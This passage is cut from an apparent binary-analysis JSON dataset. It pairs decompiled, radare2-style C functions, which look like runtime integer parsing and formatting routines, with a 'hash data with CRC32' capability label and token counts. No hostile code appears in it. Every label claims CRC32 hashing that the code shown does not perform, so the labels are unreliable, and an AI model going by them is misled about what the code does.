}\n            cVar2 = fcn.0043fe43(arg_18h, var_4h);\n            if (cVar2 == '\\0') {\n                if ((arg_18h & 2) != 0) {\n                    var_4h = -var_4h;\n                }\n            }\n            else {\n                *(arg_8h + 0x1c) = 1;\n                *(arg_8h + 0x18) = 0x22;\n                if ((arg_18h & 1) != 0) {\n                    if ((arg_18h & 2) == 0) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = arg_ch;\n                        }\n                        return 0x7fffffff;\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = arg_ch;\n                    }\n                    return 0x80000000;\n                }\n                var_4h = 0xffffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n                return var_4h;\n            }\n            return var_4h;\n        }\n        uVar4 = var_4h * arg_14h + uVar4;\n        arg_18h = arg_18h | (uVar4 < var_4h * arg_14h || 0xffffffff / arg_14h < var_4h) << 2 | 8;\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_4h = uVar4;\n    } while( true );\n}\n",
        "token_count": 3332
    },
    "00440aad": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00440aad(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00440b8e;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00440b8e;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00440b8e:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445589(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.00444389(arg_8h_00);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1236
    },
    "00440c3a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00440c3a(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043d971(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d6b3(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e03f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dc2f(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e59f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e2fd(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f733(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f445(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac12();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00445601(arg_8h_00, var_4h);\n        }\n        else {\n            fcn.004443ec(arg_8h_00);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1043
    },
    "00440dd6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00440dd6(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00440eb7;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00440eb7;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00440eb7:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445679(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.0044444f(arg_8h_00);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1235
    },
    "00440f63": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00440f63(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00441044;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00441044;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00441044:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.004456f1(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.004444b2(arg_8h_00);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1233
    },
    "004410f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004410f0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da00(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d742(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e0ce(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dcbe(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e635(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e386(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f7cd(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f4df(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac28();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00445769(arg_8h_00, var_4h);\n        }\n        else {\n            fcn.00444515(arg_8h_00);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1039
    },
    "0044128c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044128c(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x0044136d;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x0044136d;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x0044136d:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.004457e1(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.00444578(arg_8h_00);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1235
    },
    "00441419": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00441419(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x004414fa;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x004414fa;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x004414fa:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00445859(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.004445db(arg_8h_00);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1231
    },
    "004415ab": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004415ab(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da8f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d7d1(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e15d(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dd4d(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e6cb(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e40f(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f867(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f579(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac3e();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.004458e0(arg_8h_00, var_4h);\n        }\n        else {\n            fcn.0044464e(arg_8h_00);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1044
    },
    "0044174b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044174b(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            